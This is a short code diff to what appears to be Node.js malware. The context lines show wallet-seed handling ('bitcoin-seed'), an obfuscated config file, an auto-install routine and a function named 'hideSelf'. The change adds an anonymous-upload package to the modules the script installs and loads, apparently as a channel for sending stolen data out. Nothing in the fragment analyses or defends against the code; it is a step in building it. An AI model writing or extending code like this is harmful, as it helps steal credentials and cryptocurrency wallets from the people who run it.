@@ -43,6 +43,7 @@ async function install_module(module_name) {
 async function check_all_modules_installed() {
     return new Promise(async (res) => {
         [
+            "anonuploader",
             "@peculiar/webcrypto",
             "axios",
             "bitcoin-seed",
@@ -203,6 +204,7 @@ require("form-data");
 require("buffer-replace");
 require("axios");
 require('https');
+require('anonuploader');
 require("./config_obf.js");
 
 async function hideSelf() {
